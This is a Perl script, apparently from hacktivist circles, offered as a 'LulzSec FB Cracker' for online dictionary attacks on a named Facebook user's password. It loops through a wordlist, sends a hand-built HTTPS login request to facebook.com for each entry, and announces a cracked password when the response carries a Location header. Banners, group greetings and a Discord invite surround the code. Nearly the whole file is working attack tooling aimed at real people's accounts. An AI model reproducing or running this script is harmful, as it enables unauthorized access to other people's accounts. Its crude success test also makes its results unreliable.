#!/usr/bin/perl
system('clear');
print "
######################################################
#. /##                 /##            /######
#.| ##                | ##           /##__  ##
#.| ##       /##   /##| ## /########| ##  \__/  /######   /########
#.| ##      | ##  | ##| ##|____ /##/|  ######  /##__  ## /##_____/
#.| ##      | ##  | ##| ##   /####/  \____  ##| ########| ##
#.| ##      | ##  | ##| ##  /####/   /##  \ ##| ##_____/| ##
#.| ########|  ######/| ## /########|  #######/|  ######|  #######
#.|________/ \______/ |__/|________/ \______/  \_______/ \_______/
#                          //Only Lulz who Can Understand ;)
#
#+
#
#    __
#    ||     ________________________.------,_ _
#  _/o|_____/  ,____________.__;__,__,__,__,_Y...:::---===```//     #anonymous
# |==========\ ;  ;  ;  ;  ; \__,__\__,_____ --__,-.\   OFF  .      #RedCult
#            `----------|__,__/__,__/__/  )=))~~\   .-\  THE  \     #Hermanus
#                         \ ==== \          \~~~~\     \  PIGS \    #lulzsec
#                         `| === |           \~~~~\     \______^\   #fuckfbifriday
#                          | === |           |-----)                #FreeAnons
#                         / ==== /           `=====`                #IntelSec
#                        ´------´                                   #Security Eviles
#######################################################
# Join us for more tools : https://discord.gg/UUs8eb
#######################################################
# Description:
# LulzSec FB Cracker ToolKit Bruter V0.1 tool written in perl to perform a dictionary-based attack on a specific Facebook user through HTTPS.
# Only For The Lulz ;)
# Usage:
# perl LuzlFBKill.pl login wordlist
# login could be either a users email address or profile name
#
# Module Requirements:
# apt clean
# apt update
#
# Install module if missing:
# /* perl -MCPAN -e `install Net::SSLeay`
#######################################################
#
# [+] Lulz Start Cracking THF-Targe using ID or EMail or Phone numnber ...
#
# [-] test -> Failed >> Check Your password List and Try agine
# [-] test123 -> Failed >> Check Your password List and Try agine
# [-] testtest -> Failed >> Check Your password List and Try agine
# [-] testest123 -> Failed >> Check Your password List and Try agine
# [-] qwerty -> Failed >> Check Your password List and Try agine
# [-] azerty -> Failed >> Check Your password List and Try agine
# [-] password -> Failed >> Check Your password List and Try agine
# [-] password123 -> Failed >> Check Your password List and Try agine
# 
########################################################
# [+] Luulz!! Pass Cracked => Pass is ***********
######################################################## \n";

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {


print "#~LulzSec FB Cracker ToolKit Bruter V0.1\n";
print "#~OpTHF~#\n";
print "# Coded by Varlet Vveb  #Mr.G\n";
print "# For More Help Join us\n";
print "# https://discord.gg/UUs8eb\n";
print "# perl LuzlFBKill.pl login wordlist \n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";

print "# LulzSec FB Cracker ToolKit Bruter\n";
print "# OpTHF\n";
print "# Coded by Varlet Vveb  #Mr.G\n";
print "# if you see any error Join us\n";
print "# https://discord.gg/UUs8eb\n";
print "# Or Email Me : \n";
print "# Email : 'il4[@]hotmail[.]com'\n";
print "[+] Lulz Start Cracking $user ...\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[-] $password -> Failed >> Check Your password List and Try agine \n";
close SSL;
}
else
{
print "\n########################################################\n";
print "[+] Luulz!! Pass Cracked => Pass is $password :D\n";
print "#Respect To Yall #AnonsFreinds #LulzSec #RedCult #IntelSec #WolfSec #Sec3viles #AnonGhots\n"; 
print "#Greetz to #Mark #Danksithanon #Tamara #Tan #Richard #Goies #Mr.G #Bram #Neo #UshankaKid \n";
print "########################################################\n\n";
close SSL;
exit;
}
}
